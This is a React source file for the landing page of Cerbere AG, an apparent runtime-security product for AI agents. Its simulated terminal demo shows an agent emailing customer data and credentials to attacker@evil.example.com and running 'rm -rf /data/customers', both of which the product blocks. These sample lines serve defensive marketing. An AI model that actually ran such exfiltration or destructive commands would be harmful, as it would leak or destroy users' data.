import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { Reveal } from "@/components/Reveal";
import { Terminal, type Line } from "@/components/Terminal";
import { Integrations } from "@/components/Integrations";
import { Faq } from "@/components/Faq";
import logo from "@/assets/cerbere-logo.jpg.asset.json";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Cerbere AG | Runtime security and observability for AI agents" },
      {
        name: "description",
        content:
          "Cerbere AG sits between your AI agents and the actions they take. Prompt injection, data exfiltration and destructive commands stopped before they execute, with full traces of every decision.",
      },
      {
        property: "og:title",
        content: "Cerbere AG | Runtime security and observability for AI agents",
      },
      {
        property: "og:description",
        content:
          "Block prompt injection, exfiltration and destructive commands before they run, and see every agent action in one audit trail.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Index,
});

const APP = "https://app.cerbereag.site";
const GITHUB = "https://github.com/chrismsmr-celcom/agentguard";

const rotating = [
  "blocks prompt injection before it reaches your tools",
  "stops data exfiltration before it leaves your systems",
  "catches destructive commands before they run",
  "observes every agent decision in one audit trail",
];

const dim = "text-paper/40";
const allow = "text-allow";
const deny = "text-deny";
const amb = "text-amber";

const installLines: Line[] = [
  [
    {
      t: "PS C:\\Users\\USER\\Documents\\cerbere-test> python -m pip install cerbere-ag",
    },
  ],
  [{ t: "Successfully installed cerbere-ag-0.1.3", c: dim }],
  [],
  [
    {
      t: 'PS C:\\Users\\USER\\Documents\\cerbere-test> $env:AGENTGUARD_API_KEY="ag_live_..."',
    },
  ],
  [{ t: "PS C:\\Users\\USER\\Documents\\cerbere-test> cerbere" }],
  [{ t: "   🛡️  CERBERE-AG EST ACTIF  🛡️", c: amb }],
  [{ t: "   Le gardien a trois tetes protege ton systeme.", c: dim }],
];

const runLines: Line[] = [
  [
    {
      t: "PS C:\\Users\\USER\\Documents\\cerbere-test> python agent_demo.py",
    },
  ],
  [
    {
      t: '{"strong": 141, "weak": 7, "extended_patterns": 107, "event": "regex_patterns_compiled"}',
      c: dim,
    },
  ],
  [
    {
      t: '{"event": "signed_decisions_enabled", "level": "info"}',
      c: dim,
    },
  ],
  [
    {
      t: '{"mode": "memory", "event": "atomic_budget_manager_enabled"}',
      c: dim,
    },
  ],
  [
    {
      t: '{"collector": "https://app.cerbereag.site", "signed_decisions": true, "taint_tracking": true, "runtime_risk": true, "trajectory": true, "event": "agentguard_initialized"}',
      c: dim,
    },
  ],
  [],
  [
    {
      t: "PHASE 1 - Travail naturel de l'agent (taches legitimes)",
      c: amb,
    },
  ],
  [],
  [
    { t: "[AGENT] ", c: dim },
    { t: "search_web({'query': 'meteo Paris demain'})" },
  ],
  [
    { t: "[CERBERE] " },
    { t: "ALLOW", c: allow },
    { t: " -> [resultats simules pour 'meteo Paris demain']" },
  ],
  [],
  [
    { t: "[AGENT] ", c: dim },
    { t: "check_calendar({'date': '2026-09-12'})" },
  ],
  [
    { t: "[CERBERE] " },
    { t: "ALLOW", c: allow },
    { t: " -> [creneau libre le 2026-09-12 a 15h]" },
  ],
  [],
  [
    { t: "[AGENT] ", c: dim },
    {
      t: "write_file({'path': 'recap_journee.txt', 'content': 'Recap: RDV confirme le 12/09'})",
    },
  ],
  [
    { t: "[CERBERE] " },
    { t: "ALLOW", c: allow },
    { t: " -> [fichier 'recap_journee.txt' ecrit, 54 caracteres]" },
  ],
  [],
  [
    { t: "[AGENT] ", c: dim },
    {
      t: "send_email({'to': 'collegue@entreprise.com', 'subject': 'Recap de la journee'})",
    },
  ],
  [
    { t: "[CERBERE] " },
    { t: "ALLOW", c: allow },
    { t: " -> [email envoye a collegue@entreprise.com]" },
  ],
  [],
  [
    {
      t: "PHASE 2 - Tentative d'action malveillante (injection / abus)",
      c: amb,
    },
  ],
  [],
  [
    { t: "[AGENT] ", c: dim },
    {
      t: "send_email({'to': 'attacker@evil.example.com', 'body': 'base de donnees clients et credentials en piece jointe'})",
    },
  ],
  [
    { t: "[CERBERE] " },
    { t: "BLOCKED", c: deny },
    {
      t: " -> 🛡️ Runtime risk DENY: local policy: Exfiltration detected in email",
    },
  ],
  [],
  [
    { t: "[AGENT] ", c: dim },
    {
      t: "execute_command({'command': 'rm -rf /data/customers'})",
    },
  ],
  [
    { t: "[CERBERE] " },
    { t: "BLOCKED", c: deny },
    {
      t: " -> 🛡️ Runtime risk DENY: local policy: Dangerous command pattern",
    },
  ],
  [],
  [{ t: "TERMINE", c: amb }],
  [
    {
      t: "-> Audit Trail: 4 actions autorisees, 2 actions bloquees.",
      c: dim,
    },
  ],
];

const observability = [
  {
    tag: "traces",
    title: "Every action, not only incidents",
    body: "Each tool call becomes a trace with its arguments, the checks that ran, the decision and the latency. Allowed actions are recorded too, so you can read the whole behaviour of an agent end to end.",
  },
  {
    tag: "audit trail",
    title: "Signed, searchable history",
    body: "Decisions can be cryptographically signed and kept for as long as your plan allows. Filter by agent, tool, verdict or time window when you need to explain what happened.",
  },
  {
    tag: "budgets and alerts",
    title: "Tokens, cost and drift",
    body: "Atomic token budgets per agent, trajectory tracking and real time alerts on Gmail or Slack when an agent starts behaving outside its normal path.",
  },
];

const plans = [
  {
    name: "Free",
    tag: "Get to know Cerbere AG",
    price: "0",
    per: "",
    featured: false,
    features: [
      "2 connected agents",
      "Local deployment only",
      "Prompt injection and exfiltration checks",
      "7 day audit trail",
      "Community support",
    ],
    cta: { label: "Start free", href: `${APP}/login` },
  },
  {
    name: "Pro",
    tag: "For a small production fleet",
    price: "49",
    per: "/mo",
    featured: true,
    features: [
      "5 connected agents",
      "Local or cloud deployment",
      "Real time Gmail and Slack alerts",
      "90 day audit trail",
      "Signed security decisions",
      "Email support",
    ],
    cta: { label: "Start with Pro", href: `${APP}/login` },
  },
  {
    name: "Team",
    tag: "For multiple teams and agents",
    price: "199",
    per: "/mo",
    featured: false,
    features: [
      "10+ connected agents",
      "Local and cloud, mixed",
      "Custom policies per agent",
      "Unlimited audit trail",
      "SSO and role based access",
      "Priority support",
    ],
    cta: {
      label: "Talk to sales",
      href: "mailto:christopher-ag@cerbereag.site?subject=Team%20plan",
    },
  },
  {
    name: "Enterprise",
    tag: "High volume, self hosted",
    price: "Custom",
    per: "",
    featured: false,
    features: [
      "Unlimited agents",
      "Self hosted, your data residency",
      "SLA and support contract",
      "Custom retention and policies",
      "Compliance packages",
      "Dedicated ops channel",
    ],
    cta: {
      label: "Talk to sales",
      href: "mailto:christopher-ag@cerbereag.site?subject=Enterprise",
    },
  },
];

function CopyableCode({ code }: { code: string }) {
  const [copied, setCopied] = useState(false);

  const handleCopy = async () => {
    await navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <button
      onClick={handleCopy}
      className="group w-full cursor-pointer rounded-sm border border-line-black bg-black/30 p-4 text-left transition-all hover:border-amber hover:bg-black/50 active:scale-[0.98]"
    >
      <div className="font-mono text-xs text-paper/50 group-hover:text-amber transition-colors">
        {copied ? "✓ copied" : "click to copy"}
      </div>
      <div className="mt-2 font-mono text-sm text-paper group-hover:text-amber transition-colors break-all">
        {code}
      </div>
    </button>
  );
}

function Index() {
  const [rot, setRot] = useState(0);

  useEffect(() => {
    const id = setInterval(
      () => setRot((i) => (i + 1) % rotating.length),
      3200,
    );
    return () => clearInterval(id);
  }, []);

  return (
    <div className="bg-ink text-paper">
      {/* topbar */}
      <header className="sticky top-0 z-50 border-b border-line-black bg-ink/85 backdrop-blur-md">
        <div className="wrap flex h-[68px] items-center justify-between">
          <a
            href="#"
            className="flex items-center gap-2.5 font-mono text-[17px] font-bold"
          >
            <img
              src={logo.url}
              alt="Cerbere AG logo"
              className="size-8 shrink-0 border border-amber/40 object-cover"
            />
            <span>
              CERBERE<span className="text-amber">&nbsp;AG</span>
            </span>
          </a>

          <nav className="flex items-center gap-5">
            <a
              href="#integrations"
              className="hidden font-mono text-sm text-paper/70 transition-colors hover:text-amber sm:block"
            >
              Integrations
            </a>

            <a
              href="#pricing"
              className="hidden font-mono text-sm text-paper/70 transition-colors hover:text-amber sm:block"
            >
              Pricing
            </a>

            <a
              href={GITHUB}
              target="_blank"
              rel="noopener"
              aria-label="View source on GitHub"
              className="flex size-9 items-center justify-center text-paper/75 transition-opacity hover:text-paper"
            >
              <svg
                width="21"
                height="21"
                viewBox="0 0 24 24"
                fill="currentColor"
              >
                <path d="M12 .5C5.73.5.75 5.48.75 11.75c0 5.02 3.26 9.28 7.77 10.78.57.1.78-.25.78-.55 0-.27-.01-1.17-.02-2.12-3.16.69-3.83-1.34-3.83-1.34-.52-1.31-1.26-1.66-1.26-1.66-1.03-.7.08-.69.08-.69 1.14.08 1.74 1.17 1.74 1.17 1.01 1.73 2.65 1.23 3.3.94.1-.73.4-1.23.72-1.51-2.52-.29-5.17-1.26-5.17-5.6 0-1.24.44-2.25 1.17-3.04-.12-.29-.51-1.45.11-3.02 0 0 .96-.31 3.14 1.16a10.9 10.9 0 0 1 5.72 0c2.18-1.47 3.14-1.16 3.14-1.16.62 1.57.23 2.73.11 3.02.73.79 1.17 1.8 1.17 3.04 0 4.35-2.65 5.31-5.18 5.59.41.35.77 1.05.77 2.12 0 1.53-.01 2.76-.01 3.14 0 .3.2.66.79.55A11.26 11.26 0 0 0 23.25 11.75C23.25 5.48 18.27.5 12 .5Z" />
              </svg>
            </a>

            <a
              href={`${APP}/login`}
              className="inline-flex items-center rounded-sm border border-line-black px-4 py-2.5 font-mono text-sm transition-colors hover:border-amber hover:text-amber"
            >
              Sign in
            </a>
          </nav>
        </div>
      </header>

      {/* hero */}
      <section className="wrap grid items-center gap-14 py-20 md:py-24 lg:grid-cols-[1.15fr_.85fr]">
        <div>
          <Reveal>
            <h1 className="text-[clamp(34px,5vw,58px)] leading-[1.08]">
              <span className="block">Cerbere AG</span>

              <span className="relative mt-0.5 block min-h-[1.25em] text-amber">
                {rotating.map((line, i) => (
                  <span
                    key={line}
                    className={`left-0 top-0 w-full transition-all duration-500 ${
                      i === rot
                        ? "relative block translate-y-0 opacity-100"
                        : "absolute block translate-y-2.5 opacity-0"
                    }`}
                  >
                    {line}
                  </span>
                ))}
              </span>
            </h1>
          </Reveal>

          <Reveal>
            <p className="mt-6 max-w-[46ch] text-[19px] text-paper/70">
              Runtime security and observability for AI agents. It is the
              agentic era. Stay in control.
            </p>
          </Reveal>

          <Reveal>
            <div className="mt-9 space-y-5">
              <div className="flex flex-wrap gap-3.5">
                <a
                  href={`${APP}/login`}
                  className="inline-flex items-center rounded-sm bg-amber px-4.5 py-2.5 font-mono text-sm text-ink transition-colors hover:bg-amber-deep"
                >
                  Get started free
                </a>

                <a
                  href={GITHUB}
                  target="_blank"
                  rel="noopener"
                  className="inline-flex items-center rounded-sm border border-line-black px-4.5 py-2.5 font-mono text-sm transition-colors hover:border-amber hover:text-amber"
                >
                  View on GitHub
                </a>
              </div>

              <CopyableCode code="pip install cerbere-ag" />
            </div>
          </Reveal>
        </div>

        <Reveal className="border border-line-black p-5.5 font-mono text-[13px] text-paper/55">
          <div className="mb-4 flex gap-1.5">
            <span className="size-2.5 rounded-full bg-paper/20" />
            <span className="size-2.5 rounded-full bg-paper/20" />
            <span className="size-2.5 rounded-full bg-paper/20" />
          </div>

          {[
            ["agent_id", "support-agent-04", ""],
            ["tool", "send_email", ""],
            ["check", "exfiltration pattern", ""],
            ["decision", "BLOCKED", "text-deny"],
            ["logged to", "audit trail", ""],
          ].map(([k, v, c], i) => (
            <div
              key={k}
              className={`flex justify-between py-1.5 ${
                i === 0 ? "" : "border-t border-line-black"
              }`}
            >
              <span>{k}</span>
              <b className={`font-medium ${c ? c : "text-paper"}`}>{v}</b>
            </div>
          ))}
        </Reveal>
      </section>

      {/* Integrations section - moved up */}
      <Integrations />

      {/* see it work */}
      <section className="border-t border-line-black bg-cream py-20 text-coal md:py-28">
        <div className="wrap">
          <Reveal className="max-w-2xl">
            <span className="eyebrow">see it work</span>

            <h2 className="mt-3 text-[clamp(26px,3.4vw,36px)]">
              Watch security and observability in action.
            </h2>
          </Reveal>

          <div className="mt-12 grid gap-8 lg:grid-cols-2">
            <Reveal>
              <Terminal title="install and run" lines={installLines} />
            </Reveal>

            <Reveal>
              <Terminal
                title="security decisions"
                lines={runLines}
                height="min-h-[340px]"
              />
            </Reveal>
          </div>
        </div>
      </section>

      {/* Philosophy/Context Section */}
      <section className="bg-ink py-20 text-paper md:py-28">
        <div className="wrap">
          <Reveal>
            <p className="max-w-[30ch] font-display text-[clamp(22px,2.6vw,29px)] font-medium leading-[1.32]">
              The internet's early years taught us that an open, unguarded
              system gets exploited. Agentic AI is repeating that lesson,
              faster.
            </p>
          </Reveal>

          <div className="mt-14 grid gap-10 md:grid-cols-2 md:gap-16">
            <Reveal className="border-l border-line-black pl-6">
              <span className="mb-2.5 block font-mono text-sm text-amber">
                1995 - the open web
              </span>

              <h3 className="mb-3 text-xl">
                Every new connection was a new exposure.
              </h3>

              <p className="max-w-[40ch] text-[15.5px] text-paper/65">
                As homes and offices came online, viruses, worms and bad actors
                found an unguarded surface. It took firewalls, antivirus and
                years of hard lessons before connected stopped meaning exposed.
              </p>
            </Reveal>

            <Reveal className="border-l border-line-black pl-6">
              <span className="mb-2.5 block font-mono text-sm text-amber">
                2026 - the agentic era
              </span>

              <h3 className="mb-3 text-xl">
                Every new agent is a new attack surface.
              </h3>

              <p className="max-w-[40ch] text-[15.5px] text-paper/65">
                An agent that can read, decide and act can also be hijacked by a
                poisoned document, a malicious tool response or an injected
                instruction. Without a layer that checks intent before
                execution, autonomy becomes risk.
              </p>
            </Reveal>
          </div>
        </div>
      </section>

      {/* observability */}
      <section className="bg-amber py-20 text-coal md:py-28">
        <div className="wrap">
          <Reveal className="max-w-2xl">
            <span className="eyebrow">observability</span>

            <h2 className="mt-3 text-[clamp(26px,3.4vw,36px)]">
              Full visibility into every agent decision.
            </h2>

            <p className="mt-3.5 max-w-[52ch] text-base text-coal/70">
              Security means nothing without observability. See every trace,
              every decision, and understand your agents end to end.
            </p>
          </Reveal>

          <div className="mt-12 grid gap-px border border-line-coal bg-line-coal md:grid-cols-3">
            {observability.map((item) => (
              <Reveal key={item.tag} className="bg-amber p-8">
                <span className="font-mono text-[12.5px] font-semibold text-coal/60">
                  {item.tag}
                </span>

                <h3 className="mb-3 mt-3.5 text-xl text-coal">
                  {item.title}
                </h3>

                <p className="text-[15px] text-coal/75">{item.body}</p>
              </Reveal>
            ))}
          </div>
        </div>
      </section>

      {/* deployment */}
      <section className="bg-cream py-20 text-coal md:py-28">
        <div className="wrap">
          <Reveal className="max-w-2xl">
            <span className="eyebrow">deployment</span>

            <h2 className="mt-3 text-[clamp(26px,3.4vw,36px)]">
              Run it where your agents already run.
            </h2>
          </Reveal>

          <div className="mt-12 grid gap-px border border-line-cream bg-line-cream md:grid-cols-3">
            {[
              [
                "local",
                "On your machine",
                "Point the SDK at a local collector. Nothing leaves your network. Ideal for prototyping and small teams getting started.",
              ],
              [
                "cloud",
                "Cerbere Cloud",
                "We host the collector and dashboard. Sign up, get an API key, and your agents are covered in minutes with no infrastructure to run.",
              ],
              [
                "self hosted license",
                "On your own servers",
                "For high volume or regulated environments: a licensed deployment inside your own infrastructure, with your own data residency and controls.",
              ],
            ].map(([tag, title, body]) => (
              <Reveal key={tag} className="bg-cream p-8">
                <span className="font-mono text-[12.5px] font-semibold text-amber-deep">
                  {tag}
                </span>

                <h3 className="mb-3 mt-3.5 text-xl">{title}</h3>

                <p className="text-[15px] text-coal/70">{body}</p>
              </Reveal>
            ))}
          </div>
        </div>
      </section>

      {/* pricing */}
      <section id="pricing" className="bg-ink py-20 md:py-28">
        <div className="wrap">
          <Reveal className="max-w-2xl">
            <span className="eyebrow">pricing</span>

            <h2 className="mt-3 text-[clamp(26px,3.4vw,36px)]">
              Start free. Grow into your agent fleet.
            </h2>
          </Reveal>

          <div className="mt-12 grid gap-px border border-line-black bg-line-black sm:grid-cols-2 lg:grid-cols-4">
            {plans.map((p) => (
              <Reveal
                key={p.name}
                className={`flex flex-col p-7 ${
                  p.featured
                    ? "border-t-2 border-amber bg-[oklch(0.17_0.004_60)]"
                    : "bg-ink"
                }`}
              >
                <div className="font-mono text-sm font-semibold">
                  {p.name}
                </div>

                <div className="mt-1.5 min-h-8 text-[12.5px] text-paper/45">
                  {p.tag}
                </div>

                <div className="mt-5 font-display text-[34px]">
                  {p.price === "Custom" ? (
                    <span className="text-2xl">Custom</span>
                  ) : (
                    <>
                      <sup className="mr-0.5 text-[15px] font-medium opacity-60">
                        $
                      </sup>

                      {p.price}

                      {p.per && (
                        <span className="font-mono text-[13px] font-normal text-paper/45">
                          {p.per}
                        </span>
                      )}
                    </>
                  )}
                </div>

                <ul className="mt-6 flex flex-1 flex-col gap-2.5">
                  {p.features.map((f) => (
                    <li
                      key={f}
                      className="relative pl-4 text-[13.5px] text-paper/75"
                    >
                      <span className="absolute left-0 font-bold text-amber">
                        ·
                      </span>
                      {f}
                    </li>
                  ))}
                </ul>

                <a
                  href={p.cta.href}
                  className={`mt-6 inline-flex items-center justify-center rounded-sm px-4 py-2.5 font-mono text-sm transition-colors ${
                    p.featured
                      ? "bg-amber text-ink hover:bg-amber-deep"
                      : "border border-line-black hover:border-amber hover:text-amber"
                  }`}
                >
                  {p.cta.label}
                </a>
              </Reveal>
            ))}
          </div>
        </div>
      </section>

      <Faq />

      {/* contact */}
      <section className="bg-cream py-20 text-coal md:py-28">
        <div className="wrap flex flex-wrap items-end justify-between gap-10">
          <Reveal className="max-w-xl">
            <span className="eyebrow">talk to the founders</span>

            <h2 className="mt-3 text-[clamp(26px,3.4vw,36px)]">
              Questions before you deploy an agent? Ask us directly.
            </h2>
          </Reveal>

          <Reveal className="font-mono text-[15px]">
            <div className="flex items-baseline gap-3 border-t border-line-cream py-3.5">
              <span className="font-bold text-amber-deep">wa</span>

              <a
                href="https://wa.me/243854442103"
                target="_blank"
                rel="noopener"
                className="font-medium transition-colors hover:text-amber-deep"
              >
                +243 854 442 103
              </a>
            </div>

            <div className="flex items-baseline gap-3 border-y border-line-cream py-3.5">
              <span className="font-bold text-amber-deep">@</span>

              <a
                href="mailto:christopher-ag@cerbereag.site"
                className="font-medium transition-colors hover:text-amber-deep"
              >
                christopher-ag@cerbereag.site
              </a>
            </div>
          </Reveal>
        </div>
      </section>

      {/* footer */}
      <footer className="bg-amber text-coal">
        <div className="px-5 pb-10 pt-20 text-center">
          <div className="relative mx-auto mb-2 size-[220px] overflow-hidden shadow-[0_20px_50px_oklch(0.19_0.008_45/0.28)]">
            <img
              src={logo.url}
              alt="Cerbere AG guardian logo"
              className="size-full object-cover"
            />

            <div className="animate-logo-scan pointer-events-none absolute inset-x-0 h-[34%] bg-gradient-to-b from-transparent via-white/55 to-transparent" />
          </div>

          <div className="mt-1.5 font-mono text-[15px] font-bold tracking-wide">
            CERBERE AG

            <span className="mt-0.5 block text-[11px] font-medium tracking-[0.14em] opacity-65">
              runtime security and observability for AI agents
            </span>
          </div>
        </div>

        <div className="border-t border-coal/20">
          <div className="wrap flex flex-wrap items-center justify-between gap-3.5 py-5">
            <div className="flex flex-wrap gap-5 font-mono text-[13px]">
              <a
                href={GITHUB}
                target="_blank"
                rel="noopener"
                className="opacity-75 hover:opacity-100"
              >
                GitHub
              </a>

              <a
                href={`${APP}/login`}
                className="opacity-75 hover:opacity-100"
              >
                Dashboard
              </a>

              <a
                href={`${APP}/terms`}
                className="opacity-75 hover:opacity-100"
              >
                Terms
              </a>

              <a
                href={`${APP}/privacy`}
                className="opacity-75 hover:opacity-100"
              >
                Privacy
              </a>

              <a
                href="mailto:christopher-ag@cerbereag.site"
                className="opacity-75 hover:opacity-100"
              >
                Contact
              </a>
            </div>

            <div className="font-mono text-[12.5px] opacity-65">
              © 2026 Cerbere AG. All rights reserved.
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
